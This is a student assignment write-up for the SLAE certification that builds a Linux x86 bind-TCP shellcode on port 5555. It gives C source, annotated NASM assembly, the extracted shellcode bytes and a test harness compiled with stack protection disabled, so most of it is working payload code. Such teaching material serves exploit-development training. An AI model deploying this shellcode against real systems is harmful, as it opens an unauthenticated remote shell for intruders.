# Assignment 1

## What to do
- Create a Shell_Bind_TCP shellcode
    - Binds to a Port
    - Execs Shell on incoming connection
- Port number should be easily configurable

## How to do it
The path we can follow towards creating a shell_bind_tcp shellcode is to first create a shell_bind_tcp in C and transform C code into Assembly.

The following code was used as a basis:

```c
#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdint.h>

int main()
{
	uint32_t server_sockid;		//server socket descriptor
	uint32_t client_sockid;		//client socket descriptor
	struct sockaddr_in srvaddr;
	uint32_t i;			        //counter

	//create socket
	server_sockid = socket(PF_INET, SOCK_STREAM, 0);

	//initialize sockaddr struct to bind socket using it
	srvaddr.sin_family = AF_INET;
	srvaddr.sin_port = htons(5555);
	srvaddr.sin_addr.s_addr = htonl(INADDR_ANY);

	//bind socket to ip/port in sockaddr struct
	bind(server_sockid, (struct sockaddr *)&srvaddr, sizeof(srvaddr));

	//listen for incoming connection
	listen(server_sockid, 0);

	//accept incoming connection, don't store data, just use the sockfd created
	client_sockid = accept(server_sockid, NULL, NULL);

	//duplicate file descriptors for STDIN, STDOUT, STDERROR
	for (i=0; i<2; i++)
		dup2(client_sockid, i);

	//execute /bin/sh
	execve("/bin/sh", NULL, NULL);
	close(server_sockid);

	return 0;

}
```

The code above can be found in our _Assignement #1_ repo and is named as _bind.c_

You can compile this code using `gcc -o bind bind.c`

C code helps us in spotting the system calls required to make the bind shell in assembly:

- socket (will need system call _socketcall_)
- bind
- listen
- accept
- dup2
- execve

A system call is the way a program communicates directly with the Operating System's kernel. System calls take arguments like system specific constants, parameter structures, etc. The system calls and the constants values they take as arguments need to be transformed into codes. These codes can be found in header files located in the operating system.

The following table shows some useful headers where these codes are located in and an example code that can be found in each header:

| title | location | example |
| :--:  | :--:      | :--: |
| system call numbers 32-bit  | /usr/include/i386-linux-gnu/asm/unistd_32.f | __NR_socketcall = 102 |
| system-specific sockets and constants|  /usr/inluce/i386-linux-gnu/asm/socket.h | PF_INET = 2 |
| networking handling | /usr/include/linux/net.h | SYS_SOCKET = 2 |

#### Key points

This section summarises key points of the exploit development process.

- When making a sys call the sys call number must be placed in EAX while the other arguments when applicable must be placed in the order stated in the following table:

| register | contents |
|:--:|:--:|
| eax | sys call number |
| ebx | argument 1 |
| ecx | argument 2 |
| edx | argument 3 |
| esi | argument 4 |
| edi | argument 5 |

- In order to make a system call an interrupt have to be made. As far as IA-32 is used in this example, the Assembly command will be `int 0x80`.

- After making a sys call using `int 0x80` the sys call that was made stores the return value back to EAX register, overwriting as a result its previous value.

- Remember that when a sys call takes as an argument a pointer or even a struct - there is a list of arguments that should be placed in only one register - you can tackle this problem by pushing the struct's data in the memory (stack) in reverse order (mind the little or big endian architecture) and place the memory address pointing to these data into the register that will pass the argument in the sys call.

- In some cases the available memory for storing the shellcode might be small, so has to be the shellcode.

- The shellcode must not contain the null character (`\x00`). If the shellcode lies inside a buffer, null character might be considered as a string termination symbol and as a result the shellcode will not be executed.

Time to step into the actual Assembly code:
```assembly
;
; Purpose: SLAE Course
; Student ID: SLAE-998
;

global _start

section .text
_start:

	; sys call numbers /usr/include/i386-linux-gnu/asm/unistd_32.h
	; system-specific socket constants /usr/include/i386-linux-gnu/bits/socket.h
	; socket network access protocol /usr/include/linux/net.h

	; socket creation
	; socketcall(int call, unsigned long *args)
	; socket(int domain, int type, int protocol)
	xor eax, eax	; clear eax
	mov ebx, eax	; clear ebx
	push eax	; place 0 in the memory
	mov al, 0x66	; socketcall 102
	mov bl, 0x1	; sys_socket 1

	; place arguments in memory in reverse-order
	push byte 0x1	; type SOCK_STREAM 1
	push byte 0x2	; domain AF_INET 2

	mov ecx, esp	; pointer to sys_socket's args
	int 0x80	; make the sys call

	; bind sys call
	; socketcall(int call, unsigned long *args)
	; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	mov edx, eax	; save socket descriptor
	xor eax, eax	; clear eax
	push eax	; place 0 in the memory
	mov al, 0x66	; socketcall 102
	mov bl, 0x2	; sys_bind 2

	; struct sockaddr
	push word 0xb315	; bind port 5555 - reverse 0x15b3 # CHANGE THIS
	push word 0x2		; address family (AF_INET = 2)
	mov ecx, esp		; pointer to arguments

	; bind arguments

	push 0x10	; address len
	push ecx	; pointer to struct sockaddr
	push edx	; sockfd

	mov ecx, esp	; pointer to arguments
	int 0x80	; make sys call

	; listen
	; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; listen(int sockfd, int backlog)
	xor eax, eax	; clear register
	push eax	; zero into the memory

	mov al, 0x66	; socketcall 102
	mov bl, 0x4	; sys_listen

	push edx	; sockfd
	mov ecx, esp	; pointer to arguments
	int 0x80	; make the sys call

	; accept
	; socketcall(int call, unsigned long *args)
	; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	xor eax, eax	; clear eax
	push eax	; push 0 to stack
	push eax	; push 0 to stack
	push edx	; sockfd in memory - first argument

	mov al, 0x66	; socketcall 102
	mov bl, 0x5	; sys_accept

	mov ecx, esp	; pointer to arguments
	int 0x80	; make sys call

	;dup2
	; dup2(int oldfd, int newfd)
	mov ebx, eax	; sockfd to ebx
	xor ecx, ecx	; clear ecx
	mov cl, 0x2	; initialize counter

	loop:
		mov al, 0x3f	; dup2 sys call
		int 0x80	; make sys call
		dec cl		; decrement counter
		jns loop	; make the loop

	; execve
	; execve(const char *filename, char *const argv[], char *const envp[])
	xor ecx, ecx	; clear ecx
	mul ecx		; clear eax, edx

	push eax	; null - string termination
	push 0x68732f6e	; n/sh
	push 0x69622f2f	; //bi

	mov ebx, esp	; pointer to //bin/sh\0

	mov al, 0xb	; execve sys call
	int 0x80	; make sys call
```

The Assembly code can be found in _Assignment #1_ repo named as _shell.asm_

In this example port 5555 was used to bind the connection. Port 5555 translates to 0x15b3 in hex. Since our system follows the little-endian architecture, the port number has to be loaded in the memory in reverse order.

In order to change the listening port it is suggested to choose the new number convert it into hex, reverse the byte order and compile the program again.

It can be compiled using the following commands respectively:
```zsh
$ nasm -f elf -o shell.o shell.asm
$ ld -o shell shell.o
```

Next step is to extract the actual shellcode from the elf file using this one-liner command:
```zsh
$ objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
found in [commandlinefu.com](http://www.commandlinefu.com)

The exctracted bytes are:
```
"\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1"
"\xcd\x80\x89\xc2\x31\xc0\x50\xb0\x66\xb3\x02\x66\x68\x15\xb3"
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x31\xc0"
"\x50\xb0\x66\xb3\x04\x52\x89\xe1\xcd\x80\x31\xc0\x50\x50\x52"
"\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0"
"\x3f\xfe\xc9\xcd\x80\x79\xf8\x31\xc0\x50\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
```

The following code can be used to create the bind_shell_tcp elf and test the produced shellcode. The shellcode must be placed in the shellcode buffer:

```c
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1"
"\xcd\x80\x89\xc2\x31\xc0\x50\xb0\x66\xb3\x02\x66\x68\x15\xb3"
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x31\xc0"
"\x50\xb0\x66\xb3\x04\x52\x89\xe1\xcd\x80\x31\xc0\x50\x50\x52"
"\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0"
"\x3f\xfe\xc9\xcd\x80\x79\xf8\x31\xc0\x50\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(shellcode));

        int (*ret)() = (int(*)())shellcode;

        ret();

}
```

The code above can be found in _Assignement #1_ repo and is named as _shellcode.c_

You can compile this code using `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`

By running the produced executable you have a working bind_tcp_shell on the port you specified!

#### Proof of concept image


## Statement
This page has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student-ID: SLAE-998
